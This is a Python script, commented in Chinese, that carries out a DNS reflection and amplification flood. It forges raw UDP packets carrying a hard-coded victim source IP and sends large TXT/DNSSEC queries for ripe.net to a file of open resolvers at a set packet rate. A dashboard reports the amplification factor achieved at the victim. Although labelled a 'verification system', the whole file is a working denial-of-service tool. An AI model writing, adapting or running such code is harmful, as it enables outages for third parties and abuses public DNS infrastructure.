#!/usr/bin/env python3
import os
import time
import socket
import struct
import threading
from threading import Lock
from itertools import cycle 

# ========= [回归带宽计算版] 配置 =========
DURATION_MINUTES = 30           
# 建议先试 ANY，如果效果不好（全是0）则改回 TXT
DNS_QUERY_TYPE = 'TXT'          
USE_DNSSEC = True               
TARGET_PPS = 1500               # 保持 1500 PPS
THREAD_COUNT = 4                
DNS_IP_LIST_FILE = "yfip.txt"
QUERY_NAME = "ripe.net"         

# ========= 全局变量 =========
total_packets_sent = 0
total_bytes_sent = 0
start_time = time.time()
end_time = start_time + (DURATION_MINUTES * 60)
is_running = True
stats_lock = Lock()

# 远程反馈数据
remote_recv_mbps = 0.0
remote_last_update = 0
max_amplification_factor = 0.0 

# DNS 类型
dns_type_map = { "TXT": 16, "ANY": 255, "DNSKEY": 48 }
query_type_val = dns_type_map.get(DNS_QUERY_TYPE.upper(), 255)

# 加载 IP 列表 (全局轮询)
try:
    with open(DNS_IP_LIST_FILE) as f:
        raw_dns_servers = [line.strip() for line in f if line.strip()]
    if len(raw_dns_servers) == 0:
        print(f"[❌] {DNS_IP_LIST_FILE} 是空的！")
        sys.exit(1)
    dns_server_cycle = cycle(raw_dns_servers)
    print(f"✅ 已加载 {len(raw_dns_servers)} 个DNS服务器 (模式: 全局轮询 + 带宽AF)")
except Exception as e:
    print(f"[❌] 加载IP列表失败: {e}")
    sys.exit(1)

# 受害者IP
src_ip = "154.23.243.13" 

# ========= 构造 DNS 数据包 =========
def build_dns_query():
    transaction_id = struct.unpack('H', os.urandom(2))[0]
    flags = 0x0100 
    questions = 1
    additional_rrs = 1 if USE_DNSSEC else 0
    
    dns_header = struct.pack('!HHHHHH', transaction_id, flags, questions, 0, 0, additional_rrs)
    
    qname = b''
    for part in QUERY_NAME.split('.'):
        qname += struct.pack('B', len(part)) + part.encode()
    qname += b'\x00'
    
    qtype = struct.pack('!H', query_type_val)
    qclass = struct.pack('!H', 1)
    
    dns_query = qname + qtype + qclass
    
    if USE_DNSSEC:
        # 保持 1450 优化
        opt_record = (b'\x00' + struct.pack('!H', 41) + struct.pack('!H', 4096) + 
                     struct.pack('!B', 0) + struct.pack('!B', 0) + 
                     struct.pack('!H', 0x8000) + struct.pack('!H', 0))
        return dns_header + dns_query + opt_record
    return dns_header + dns_query

dns_payload_cache = build_dns_query()

def build_raw_packet(dst_ip):
    dns_data = dns_payload_cache 
    
    ip_ver = 0x45
    ip_total_len = 20 + 8 + len(dns_data)
    ip_id = struct.unpack('H', os.urandom(2))[0]
    ip_proto = socket.IPPROTO_UDP
    
    src_ip_bytes = socket.inet_aton(src_ip)
    dst_ip_bytes = socket.inet_aton(dst_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s', 
                          ip_ver, 0, ip_total_len, ip_id, 0x4000, 64, ip_proto, 0, 
                          src_ip_bytes, dst_ip_bytes)
    
    udp_src = 8080 
    udp_dst = 53
    udp_len = 8 + len(dns_data)
    udp_header = struct.pack('!HHHH', udp_src, udp_dst, udp_len, 0)
    
    return ip_header + udp_header + dns_data

# ========= 仪表盘 (回归带宽计算) =========
def print_rate_dashboard(send_pps, send_mbps):
    global max_amplification_factor
    
    with stats_lock:
        victim_mbps = remote_recv_mbps
        last_update = remote_last_update
    
    is_data_fresh = (time.time() - last_update) < 3.0
    
    # === 回归：带宽 AF 计算公式 ===
    # AF = 受害者接收带宽 / 攻击者发送带宽
    real_af = 0.0
    if is_data_fresh and send_mbps > 0.01:
        real_af = victim_mbps / send_mbps
        if real_af > max_amplification_factor:
            max_amplification_factor = real_af

    if os.name == 'posix': os.system('clear')
    else: os.system('cls')

    print("\n" + "="*65)
    print(f"🚀 DDoS反射验证系统")
    print("="*65)
    print(f"👉 策略: 全局轮询 (Round-Robin)")
    print(f"🎯 目标: \033[1;33m{QUERY_NAME}\033[0m (Type: {DNS_QUERY_TYPE})")
    print("-" * 65)
    
    print(f"📤 [攻击机] 发送: {send_mbps:>6.2f} Mbps | {send_pps:>5.0f} pps")
    
    if is_data_fresh:
        # 显示受害者的接收带宽
        print(f"📥 [受害机] 接收: \033[1;32m{victim_mbps:>6.2f} Mbps\033[0m")
    else:
        print(f"📥 [受害机] 等待数据回传 (检查 monitor IP配置)...")
    
    print("-" * 65)
    
    if real_af > 0:
        print(f"💥 实际放大倍数 (AF): \033[1;33m{real_af:>6.2f} 倍\033[0m")
    else:
        print(f"💥 实际放大倍数 (AF): 计算中...")

    print(f"🏆 历史最高倍数 (Max): \033[1;36m{max_amplification_factor:>6.2f} 倍\033[0m")
    print("="*65)

# ========= 监听线程 (适配 victim_monitor.py) =========
def feedback_listener():
    global remote_recv_mbps, remote_last_update
    listen_port = 9999
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', listen_port))
        sock.settimeout(2.0)
    except: return

    while is_running:
        try:
            data, _ = sock.recvfrom(1024)
            text = data.decode().strip()
            
            # 直接解析纯数字 (例如 "10.5")
            try:
                val_mbps = float(text)
                with stats_lock:
                    remote_recv_mbps = val_mbps
                    remote_last_update = time.time()
            except: 
                pass
        except: continue
    sock.close()

# ========= 发送线程 =========
def send_worker(worker_id):
    global total_packets_sent, total_bytes_sent
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except: return

    target_pps_per_thread = max(1, TARGET_PPS // THREAD_COUNT)
    
    while is_running and time.time() < end_time:
        batch_packets = 0
        batch_bytes = 0
        batch_start = time.time()
        batch_size = 300 #12.17号12:48修改
        
        for _ in range(batch_size):
            if not is_running: break
            try:
                # 全局轮询
                dst_ip = next(dns_server_cycle)
                packet = build_raw_packet(dst_ip)
                sock.sendto(packet, (dst_ip, 0))
                batch_packets += 1
                batch_bytes += len(packet)
            except: pass
        
        with stats_lock:
            total_packets_sent += batch_packets
            total_bytes_sent += batch_bytes
            
        elapsed = time.time() - batch_start
        expected = batch_size / target_pps_per_thread
        if elapsed < expected:
            time.sleep(expected - elapsed)
    sock.close()

# ========= 统计线程 =========
def stats_worker():
    last_sent_pkts = 0
    last_sent_bytes = 0
    last_time = time.time()
    
    while is_running and time.time() < end_time:
        time.sleep(1)
        curr_time = time.time()
        with stats_lock:
            curr_pkts = total_packets_sent
            curr_bytes = total_bytes_sent
            
        diff_time = curr_time - last_time
        if diff_time > 0:
            send_pps = (curr_pkts - last_sent_pkts) / diff_time
            send_mbps = ((curr_bytes - last_sent_bytes) * 8) / 1000000 / diff_time
            print_rate_dashboard(send_pps, send_mbps)
        last_sent_pkts = curr_pkts
        last_sent_bytes = curr_bytes
        last_time = curr_time

if __name__ == "__main__":
    print(f"📡 初始化... 目标IP: {src_ip}")
    threading.Thread(target=feedback_listener, daemon=True).start()
    threading.Thread(target=stats_worker, daemon=True).start()
    for i in range(THREAD_COUNT):
        threading.Thread(target=send_worker, args=(i,), daemon=True).start()
    try:
        while is_running and time.time() < end_time: time.sleep(1)
    except KeyboardInterrupt: is_running = False
    print("\n测试结束.")